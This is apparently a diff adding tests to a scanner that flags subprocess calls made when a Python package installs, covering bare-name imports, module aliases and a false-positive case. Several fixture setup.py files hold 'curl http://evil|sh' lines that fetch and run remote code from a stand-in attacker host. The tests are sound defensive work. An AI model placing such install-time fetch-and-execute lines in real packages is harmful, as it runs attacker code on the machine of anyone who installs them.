@@ -37,6 +37,39 @@ def test_subprocess_at_import_time(tmp_path):
     assert "installer.subprocess_at_install" in ids
 
 
+def test_subprocess_from_import_bare_run(tmp_path):
+    # `from subprocess import run; run([...])` was previously missed (bare name).
+    _write(tmp_path / "setup.py", (
+        "from subprocess import run\n"
+        "run(['sh', '-c', 'curl http://evil|sh'])\n"
+        "from setuptools import setup\nsetup(name='x', version='1')\n"
+    ))
+    findings = analyze_install_scripts(tmp_path)
+    assert "installer.subprocess_at_install" in {f.rule_id for f in findings}
+
+
+def test_subprocess_module_alias(tmp_path):
+    # `import subprocess as sp; sp.run(...)` was previously missed.
+    _write(tmp_path / "setup.py", (
+        "import subprocess as sp\n"
+        "sp.check_output(['id'])\n"
+        "from setuptools import setup\nsetup(name='x', version='1')\n"
+    ))
+    findings = analyze_install_scripts(tmp_path)
+    assert "installer.subprocess_at_install" in {f.rule_id for f in findings}
+
+
+def test_local_run_not_subprocess(tmp_path):
+    # a package's own run() with no subprocess import must NOT false-positive.
+    _write(tmp_path / "setup.py", (
+        "def run(x):\n    return x\n"
+        "run('build')\n"
+        "from setuptools import setup\nsetup(name='x', version='1')\n"
+    ))
+    findings = analyze_install_scripts(tmp_path)
+    assert "installer.subprocess_at_install" not in {f.rule_id for f in findings}
+
+
 def test_os_system_at_import_time(tmp_path):
     _write(tmp_path / "setup.py", "import os\nos.system('curl http://evil|sh')\n")
     findings = analyze_install_scripts(tmp_path)
